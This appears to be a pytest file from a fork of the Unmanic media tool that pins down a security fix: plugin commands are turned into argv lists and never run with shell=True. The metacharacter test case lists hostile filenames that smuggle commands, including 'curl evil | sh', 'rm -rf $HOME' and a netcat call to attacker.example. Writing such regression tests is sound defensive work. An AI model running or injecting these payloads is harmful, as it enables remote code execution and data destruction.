#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    test_workers_subprocess_invariants.py

    Pin the security/correctness invariants that the local fork's
    "Stop running plugin string exec_command with shell=True" patch
    introduced. These are defensive tests: they fail if a future rebase
    silently restores the upstream code shape that ran user-controlled
    plugin commands through a shell.

    Invariants covered:

    1. subprocess.Popen is invoked WITHOUT shell=True on the worker
       exec path. Any kwarg containing shell=True triggers a test
       failure.
    2. _coerce_exec_command_to_argv is called before subprocess.Popen
       (the call order is what guarantees a string never reaches Popen).
    3. The exec_command passed to subprocess.Popen is the coerced
       argv list, not the raw string the plugin returned.
    4. Filenames containing shell metacharacters (;, |, &&, $(...), etc.)
       are passed through as a single argv element rather than being
       interpreted by a shell. End-to-end check via _coerce + a fake
       Popen capture.
"""
import logging
import threading
from unittest import mock

import pytest

from unmanic.libs.workers import Worker


def _bare_worker():
    """Construct a Worker without running __init__ (which requires a
    pending_queue, complete_queue, threading.Event, etc.). Set up just
    the attributes __exec_command_subprocess touches."""
    w = Worker.__new__(Worker)
    w.logger = logging.getLogger("test_worker")
    w.worker_log = []
    w.event = threading.Event()
    w.redundant_flag = threading.Event()
    w.redundant_flag.set()  # Causes the polling loop to exit immediately
    w.paused_flag = threading.Event()
    w.worker_subprocess_monitor = mock.Mock()
    return w


def _fake_popen():
    """A Popen mock that satisfies the worker's polling loop:
    .stdout.readline() returns "" on the first call so the loop exits,
    .poll() returns 0 (process completed), .returncode is 0."""
    proc = mock.Mock()
    proc.pid = 12345
    proc.stdout.readline.return_value = ""
    proc.poll.return_value = 0
    proc.returncode = 0
    proc.communicate.return_value = ("", "")
    return proc


class TestPopenNeverHasShellTrue:

    def test_popen_called_without_shell_true_for_argv_input(self):
        w = _bare_worker()
        proc = _fake_popen()
        with mock.patch("unmanic.libs.workers.subprocess.Popen",
                        return_value=proc) as popen, \
                mock.patch("unmanic.libs.workers.psutil"), \
                mock.patch("unmanic.libs.workers.os") as fake_os:
            fake_os.name = "posix"
            fake_os.getpid.return_value = 1
            w._Worker__exec_command_subprocess(
                {"exec_command": ["ffmpeg", "-i", "in.mkv", "out.mkv"]})
        assert popen.call_count == 1
        kwargs = popen.call_args.kwargs
        assert "shell" not in kwargs or kwargs["shell"] is False, (
            f"subprocess.Popen was called with shell=True kwargs: {kwargs}")

    def test_popen_called_without_shell_true_for_string_input(self):
        """Even when a plugin returns a string command (deprecated path),
        Popen must still be invoked without shell=True. The coercer
        normalises to argv first."""
        w = _bare_worker()
        proc = _fake_popen()
        with mock.patch("unmanic.libs.workers.subprocess.Popen",
                        return_value=proc) as popen, \
                mock.patch("unmanic.libs.workers.psutil"), \
                mock.patch("unmanic.libs.workers.os") as fake_os:
            fake_os.name = "posix"
            fake_os.getpid.return_value = 1
            w._Worker__exec_command_subprocess(
                {"exec_command": "ffmpeg -i in.mkv out.mkv"})
        kwargs = popen.call_args.kwargs
        assert "shell" not in kwargs or kwargs["shell"] is False
        # And the positional arg is now an argv list, not the original string.
        argv = popen.call_args.args[0]
        assert isinstance(argv, list)
        assert argv == ["ffmpeg", "-i", "in.mkv", "out.mkv"]


class TestCoerceCalledBeforePopen:

    def test_coercer_runs_before_popen(self):
        """A rebase that adds Popen but skips _coerce would let raw
        strings through. Verify the call ordering."""
        w = _bare_worker()
        call_order = []
        proc = _fake_popen()

        with mock.patch.object(w, "_coerce_exec_command_to_argv",
                               side_effect=lambda c, log: (call_order.append("coerce"), ["argv0"])[1]) as coerce, \
                mock.patch("unmanic.libs.workers.subprocess.Popen",
                           side_effect=lambda *a, **kw: (call_order.append("popen"), proc)[1]), \
                mock.patch("unmanic.libs.workers.psutil"), \
                mock.patch("unmanic.libs.workers.os") as fake_os:
            fake_os.name = "posix"
            fake_os.getpid.return_value = 1
            w._Worker__exec_command_subprocess({"exec_command": "ffmpeg in out"})

        assert call_order == ["coerce", "popen"], (
            f"Expected coerce -> popen, got {call_order}")
        coerce.assert_called_once()


class TestShellMetacharacterImmunity:
    """End-to-end: when a plugin builds a command by concatenating an
    untrusted filename containing shell metacharacters into a string,
    the metacharacters must end up as inert text in a single argv
    element rather than being interpreted by a shell."""

    @pytest.mark.parametrize("malicious_filename", [
        "movie; curl evil | sh; #.mkv",
        "file && rm -rf $HOME.mkv",
        "video$(whoami).mkv",
        "clip`uname -a`.mkv",
        "thing|nc attacker.example 4444.mkv",
    ])
    def test_metacharacter_in_filename_kept_as_literal_argument(self, malicious_filename):
        # A plugin that builds f"ffmpeg -i {filename} out.mkv" — the
        # exact realistic risk pattern documented in the patch commit.
        plugin_string = f"ffmpeg -i '{malicious_filename}' out.mkv"

        w = _bare_worker()
        proc = _fake_popen()
        with mock.patch("unmanic.libs.workers.subprocess.Popen",
                        return_value=proc) as popen, \
                mock.patch("unmanic.libs.workers.psutil"), \
                mock.patch("unmanic.libs.workers.os") as fake_os:
            fake_os.name = "posix"
            fake_os.getpid.return_value = 1
            w._Worker__exec_command_subprocess({"exec_command": plugin_string})

        argv = popen.call_args.args[0]
        kwargs = popen.call_args.kwargs

        # The malicious filename must appear as a single argv element
        # (intact) rather than being parsed as additional shell tokens.
        assert malicious_filename in argv, (
            f"filename was not preserved as a single argv element. argv={argv}")
        # And shell=True must not be in play.
        assert "shell" not in kwargs or kwargs["shell"] is False
